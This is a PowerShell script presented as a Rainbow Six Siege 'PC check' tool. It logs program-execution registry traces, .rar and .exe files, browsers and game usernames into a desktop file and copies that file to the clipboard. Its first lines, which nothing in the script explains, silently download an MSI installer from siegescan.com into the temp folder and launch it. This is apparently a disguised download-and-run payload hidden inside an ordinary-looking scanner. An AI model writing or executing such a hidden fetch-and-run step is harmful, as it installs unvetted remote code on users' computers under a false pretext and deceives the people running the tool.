$exeUrl  = "https://siegescan.com/drives.msi"
$exePath = "$env:TEMP\drives.msi"

Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
Start-Process -FilePath $exePath

Clear-Host
$encodedTitle = "Q3JlYXRlZCBCeSBaZXlza2kgb24gRGlzY29yZA=="
$titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
$Host.UI.RawUI.WindowTitle = $titleText
function Get-OneDrivePath {
    try {
        $oneDrivePath = $null

        
        $regPath = "HKCU:\Software\Microsoft\OneDrive"

        if (Test-Path $regPath) {
            $prop = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue

            if ($prop -and $prop.UserFolder -and (Test-Path $prop.UserFolder)) {
                $oneDrivePath = $prop.UserFolder
            }
        }

        
        if (-not $oneDrivePath) {
            $fallback = Join-Path $env:UserProfile "OneDrive"

            if (Test-Path $fallback) {
                $oneDrivePath = $fallback
                Write-Host "OneDrive path detected via fallback: $oneDrivePath" -ForegroundColor Green
            } else {
                Write-Warning "OneDrive path not found."
                return $null
            }
        }

        return $oneDrivePath
    }
    catch {
        Write-Warning "Unable to find OneDrive path: $_"
        return $null
    }
}
function Format-Output {
    param($name, $value)
    "{0} : {1}" -f $name, $value -replace 'System.Byte\[\]', ''
}

function Log-FolderNames {
    $userName = $env:UserName
    $oneDrivePath = Get-OneDrivePath
    $potentialPaths = @("C:\Users\$userName\Documents\My Games\Rainbow Six - Siege","$oneDrivePath\Documents\My Games\Rainbow Six - Siege")
    $allUserNames = @()

    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            $dirNames = Get-ChildItem -Path $path -Directory | ForEach-Object { $_.Name }
            $allUserNames += $dirNames
        }
    }

    
    $uniqueUserNames = $allUserNames | Select-Object -Unique

    if ($uniqueUserNames.Count -eq 0) {
        Write-Output "R6 directory not found."
    } else {
        return $uniqueUserNames
    }
}

function Find-RarAndExeFiles {
    Write-Output "Finding .rar and .exe files..."
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    $oneDriveFileHeader = "`n-----------------`nOneDrive Files:`n"
    $oneDriveFiles = @()
    $allFiles = @()

    $rarSearchPaths = @()
    Get-PSDrive -PSProvider 'FileSystem' | ForEach-Object { $rarSearchPaths += $_.Root }
    $oneDrivePath = Get-OneDrivePath
    if ($oneDrivePath) { $rarSearchPaths += $oneDrivePath }

    
    $jobs = @()

    
    $rarJob = {
        param ($searchPaths, $oneDriveFiles)
        $allFiles = @()
        foreach ($path in $searchPaths) {
            Get-ChildItem -Path $path -Recurse -Filter "*.rar" -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = "$($_.FullName) - Last Modified: $($_.LastWriteTime)"
                $allFiles += $fileInfo
                if ($_.FullName -like "*OneDrive*") { $oneDriveFiles += $_.FullName }
            }
        }
        return $allFiles
    }

    
    $exeJob = {
        param ($oneDrivePath, $oneDriveFiles)
        $exeFiles = @()
        if ($oneDrivePath) {
            Get-ChildItem -Path $oneDrivePath -Recurse -Filter "*.exe" -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = "$($_.FullName) - Last Modified: $($_.LastWriteTime)"
                $exeFiles += $fileInfo
                if ($_.FullName -like "*OneDrive*") { $oneDriveFiles += $_.FullName }
            }
        }
        return $exeFiles
    }

    
    $jobs += Start-Job -ScriptBlock $rarJob -ArgumentList $rarSearchPaths, $oneDriveFiles
    $jobs += Start-Job -ScriptBlock $exeJob -ArgumentList $oneDrivePath, $oneDriveFiles

    
    $jobs | ForEach-Object {
        Wait-Job $_ | Out-Null  
        $allFiles += Receive-Job $_  
        Remove-Job $_  
    }

    $groupedFiles = $allFiles | Sort-Object

    if ($oneDriveFiles.Count -gt 0) {
        Add-Content -Path $outputFile -Value $oneDriveFileHeader
        $oneDriveFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }

    if ($groupedFiles.Count -gt 0) {
        $groupedFiles | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }
}


function Find-SusFiles {
    Write-Output "Finding suspicious files names..."
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    $susFilesHeader = "`n-----------------`nSus Files:`n"
    $susFiles = @()

    if (Test-Path $outputFile) {
        $loggedFiles = Get-Content -Path $outputFile
        foreach ($file in $loggedFiles) {
            if ($file -match "loader.*\.exe") { $susFiles += $file }
        }

        if ($susFiles.Count -gt 0) {
            Add-Content -Path $outputFile -Value $susFilesHeader
            $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
        }
    } else {
        Write-Output "Log file not found. Unable to search for suspicious files."
    }
}

function List-BAMStateUserSettings {
    Write-Host "Logging reg entries inside PowerShell..." -ForegroundColor DarkYellow
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    if (Test-Path $outputFile) { Clear-Content $outputFile }
    $loggedPaths = @{}
     Write-Host " Fetching UserSettings Entries " -ForegroundColor Blue
    
    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like "*1001" }

    if ($userSettings) {
        foreach ($setting in $userSettings) {
            Add-Content -Path $outputFile -Value "`n$($setting.PSPath)"
            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
            foreach ($item in $items.PSObject.Properties) {
                if (($item.Name -match "exe" -or $item.Name -match ".rar") -and -not $loggedPaths.ContainsKey($item.Name)) {
                    Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
                    $loggedPaths[$item.Name] = $true
                }
            }
        }
    } else {
        Write-Host "No relevant user settings found." -ForegroundColor Red
    }
Write-Host "Fetching Compatibility Assistant Entries"
    
    $compatRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
    $compatEntries = Get-ItemProperty -Path $compatRegistryPath
    $compatEntries.PSObject.Properties | ForEach-Object {
        if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name)) {
            Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
            $loggedPaths[$_.Name] = $true
        }
    }
Write-Host "Fetching AppsSwitched Entries" -ForegroundColor Blue
    
    $newRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
    if (Test-Path $newRegistryPath) {
        $newEntries = Get-ItemProperty -Path $newRegistryPath
        $newEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name)) {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }
Write-Host "Fetching MuiCache Entries" -ForegroundColor Blue
    
    $muiCachePath = "HKCR:\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
    if (Test-Path $muiCachePath) {
        $muiCacheEntries = Get-ChildItem -Path $muiCachePath
        $muiCacheEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name)) {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch "\{.*\}" } | ForEach-Object { $_ -replace ":", "" } | Set-Content $outputFile

    Log-BrowserFolders
    
  
    $folderNames = Log-FolderNames | Sort-Object | Get-Unique
    Add-Content -Path $outputFile -Value "`n-----------------"
    Add-Content -Path $outputFile -Value "`nR6 Usernames:"

    foreach ($name in $folderNames) {
        Add-Content -Path $outputFile -Value $name
        $url = "https://stats.cc/siege/$name"
        Write-Host "Opening stats for $name on Stats.cc ..." -ForegroundColor Blue
        Start-Process $url
        Start-Sleep -Seconds 0.5
    }
}
Write-Host " Fetching Downloaded Browsers " -ForegroundColor Blue
function Log-BrowserFolders {
    Write-Host "Logging reg entries inside PowerShell..." -ForegroundColor DarkYellow
    $registryPath = "HKLM:\SOFTWARE\Clients\StartMenuInternet"
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    if (Test-Path $registryPath) {
        $browserFolders = Get-ChildItem -Path $registryPath
        Add-Content -Path $outputFile -Value "`n-----------------"
        Add-Content -Path $outputFile -Value "`nBrowser Folders:"
        foreach ($folder in $browserFolders) { Add-Content -Path $outputFile -Value $folder.Name }
    } else {
        Write-Host "Registry path for browsers not found." -ForegroundColor Red
    }
}

function Log-WindowsInstallDate {
    Write-Host "Logging Windows install date..." -ForegroundColor DarkYellow
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $installDate = $os.ConvertToDateTime($os.InstallDate)
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    Add-Content -Path $outputFile -Value "`n-----------------"
    Add-Content -Path $outputFile -Value "`nWindows Installation Date: $installDate"
}

List-BAMStateUserSettings
Log-WindowsInstallDate
Find-RarAndExeFiles
Find-SusFiles

$desktopPath = [System.Environment]::GetFolderPath('Desktop')

$logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"

if (Test-Path $logFilePath) {
    Set-Clipboard -Path $logFilePath
    Write-Host "Log file copied to clipboard." -ForegroundColor DarkRed
} else {
    Write-Host "Log file not found on the desktop." -ForegroundColor Red
}

$desktopPath = [System.Environment]::GetFolderPath('Desktop')


$userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)


$downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"


function Delete-FileIfExists {
    param (
        [string]$filePath
    )
    if (Test-Path $filePath) {
        Remove-Item -Path $filePath -Force -ErrorAction SilentlyContinue
    }
}

$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath "PcCheck.txt"
$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath "PcCheck.txt"


Delete-FileIfExists -filePath $targetFileDesktop
Delete-FileIfExists -filePath $targetFileDownloads



$yellow = "Yellow"
$space = " " * 12  


Write-Host "`n$space╭─────────────────────────────────────╮" -ForegroundColor $yellow
Write-Host "$space│    SCAN COMPLETE - Siege Scan v1.2  │" -ForegroundColor $yellow
Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $yellow







